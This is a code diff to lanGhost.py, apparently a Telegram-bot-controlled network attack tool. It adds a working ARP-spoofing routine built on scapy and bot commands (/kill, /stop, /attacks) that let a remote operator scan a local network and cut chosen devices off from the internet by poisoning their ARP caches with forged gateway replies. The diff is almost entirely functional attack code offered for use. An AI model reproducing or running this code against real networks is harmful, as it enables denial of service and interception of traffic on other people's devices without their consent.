@@ -3,14 +3,17 @@
 # lanGhost.py
 # author: xdavidhu
 
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
+
 from telegram.ext import Updater, CommandHandler
 from netaddr import IPAddress
+from scapy.all import send, ARP
 from time import sleep
 import netifaces
 import threading
 import telegram
 import requests
-import logging
 import time
 import nmap
 import json
@@ -62,13 +65,64 @@ def subscriptionHandler(bot):
 
         time.sleep(5)
 
+def arpSpoof(target, ID):
+    global iface_mac
+    global gw_ip
+    global gw_mac
+    while True:
+        if attackManager("isrunning", ID=ID) == True:
+            send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), count=100, verbose=False)
+            time.sleep(1)
+        else:
+            send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), count=100, verbose=False)
+            break
+
+def attackManager(action, attack_type=False, target=False, ID=False):
+    global running_attacks
+    # Layout: [[ID, attack_type, target, thread]]
+
+    def getNewID():
+        if running_attacks == []:
+            return 1
+        else:
+            latest_attack = running_attacks[-1]
+            return latest_attack[0] + 1
+
+    if action == "new":
+        ID = getNewID()
+        running_attacks.append([ID, attack_type, target])
+        return ID
+
+    elif action == "del":
+        removed = False
+        for attack in running_attacks:
+            if attack[0] == int(ID):
+                removed = True
+                running_attacks.remove(attack)
+        return removed
+
+    elif action == "isrunning":
+        for attack in running_attacks:
+            if attack[0] == int(ID):
+                return True
+        return False
+
+    elif action == "isattacked":
+        for attack in running_attacks:
+            if attack[1] == attack_type and attack[2] == target:
+                return True
+        return False
+
+    elif action == "list":
+        return running_attacks
+
 def msg_start(bot, update):
     bot.send_message(chat_id=update.message.chat_id, text="Welcome to lanGhost! 👻")
 
 def msg_ping(bot, update):
     bot.send_message(chat_id=update.message.chat_id, text="Pong! ⚡️")
 
-def msg_scan(bot, update):
+def msg_scan(bot, update, args):
     bot.send_message(chat_id=update.message.chat_id, text="Scanning network... 🔎")
     hosts = scan()
     textline = "📱 Devices online:\n\n"
@@ -76,6 +130,66 @@ def msg_scan(bot, update):
         textline += host[0] + " ➖ " + resolveMac(host[1]) + "\n"
     textline = textline[:-2]
     bot.send_message(chat_id=update.message.chat_id, text=textline)
+
+def msg_kill(bot, update, args):
+    if args == []:
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /kill [IP]")
+        return
+
+    target_ip = args[0]
+
+    if attackManager("isattacked", attack_type="kill", target=target_ip):
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target is already under attack.")
+        return
+
+    hosts = scan()
+    target_mac = False
+    for host in hosts:
+        if host[0] == target_ip:
+            target_mac = host[1]
+    if not target_mac:
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
+        return
+
+    ID = attackManager("new", attack_type="kill", target=target_ip)
+
+    target = [target_ip, target_mac]
+    kill_thread = threading.Thread(target=arpSpoof, args=[target, ID])
+    kill_thread.daemon = True
+    kill_thread.start()
+
+    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
+    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
+    bot.send_message(chat_id=update.message.chat_id, text="🔥 Killing internet for " + target_ip + "...")
+
+def msg_stop(bot, update, args):
+    if args == []:
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /stop [ATTACK ID]")
+        return
+
+    try:
+        ID = int(args[0])
+    except:
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Attack ID must be a number.")
+        return
+
+    if not attackManager("del", ID=ID):
+        bot.send_message(chat_id=update.message.chat_id, text="⚠️ No attack with ID " + str(ID) + ".")
+        return
+
+    bot.send_message(chat_id=update.message.chat_id, text="✅ Attack " + str(ID) + " stopped...")
+
+def msg_attacks(bot, update, args):
+    attacks = attackManager("list")
+
+    if attacks == []:
+            bot.send_message(chat_id=update.message.chat_id, text="✅ There are no attacks currently running...")
+            return
+
+    textline = ""
+    for attack in attacks:
+        textline += "ID: " + str(attack[0]) + " ➖ " + attack[1] + " ➖ " + attack[2] + "\n"
+    bot.send_message(chat_id=update.message.chat_id, text="🔥 Attacks running:\n\n" + textline)
 
 def main():
     updater = Updater(token=telegram_api)
@@ -90,8 +204,14 @@ def main():
     dispatcher.add_handler(start_handler)
     ping_handler = CommandHandler('ping', msg_ping)
     dispatcher.add_handler(ping_handler)
-    scan_handler = CommandHandler('scan', msg_scan)
+    scan_handler = CommandHandler('scan', msg_scan, pass_args=True)
     dispatcher.add_handler(scan_handler)
+    kill_handler = CommandHandler('kill', msg_kill, pass_args=True)
+    dispatcher.add_handler(kill_handler)
+    stop_handler = CommandHandler('stop', msg_stop, pass_args=True)
+    dispatcher.add_handler(stop_handler)
+    attacks_handler = CommandHandler('attacks', msg_attacks, pass_args=True)
+    dispatcher.add_handler(attacks_handler)
 
     print("[+] Telegram bot started...")
     updater.start_polling()
@@ -122,6 +242,7 @@ if __name__ == '__main__':
         exit()
 
     iface_info = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
+    iface_mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]
     netmask = iface_info["netmask"]
     ip = iface_info["addr"]
     ip_range = ip + "/" + str(IPAddress(netmask).netmask_bits())
@@ -129,10 +250,21 @@ if __name__ == '__main__':
     for i in netifaces.gateways()[2]:
         if i[1] == interface:
             gw_ip = i[0]
+    gw_mac = False
     if not gw_ip:
-        print("[!] Cant get gateway...")
+        print("[!] Cant get gateway IP...")
+    else:
+        hosts = scan()
+        for host in hosts:
+            if host[0] == gw_ip:
+                gw_mac = host[1]
+    if not gw_mac:
+        print("[!] Cant get gateway MAC...")
     print("[+] IP address: " + ip)
+    print("[+] Interface MAC: " + iface_mac)
     print("[+] Netmask: " + netmask)
     print("[+] IP range: " + ip_range)
     print("[+] Gateway IP: " + gw_ip)
+    print("[+] Gateway MAC: " + gw_mac)
+    running_attacks = []
     main()
